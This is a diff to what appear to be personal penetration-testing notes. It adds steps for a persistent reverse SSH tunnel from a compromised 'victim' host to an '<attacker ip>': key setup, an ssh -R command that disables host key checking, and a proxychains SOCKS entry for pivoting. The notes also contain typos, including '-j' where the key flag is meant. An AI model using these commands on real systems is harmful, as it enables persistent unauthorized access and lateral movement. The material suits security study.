@@ -26,8 +26,15 @@
       process : ps aux
       network : netstat -tulpn
       file system : /etc/fstab
-  - tunneling
-
+  - creating a stable reserse tunnel
+    > make a ssh key on victim
+    > copy the public key into attacker's authorized_keys file
+      from="<victim ip>",command="",no-agent-forwarding,no-X11-forwarding,no-pty <public key>
+    > tunneling
+      ssh -f -N -R <port> -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -j /var/lib/mysql/.ssh/id_rsa <user>@<attacker ip>
+    > establish socks proxy
+      echo "socks4 127.0.0.1 <port>" >> /etc/proxychains.conf
+    > enumeration -> exploitation -> tunneling -> repeat
 
 
 *retarget db
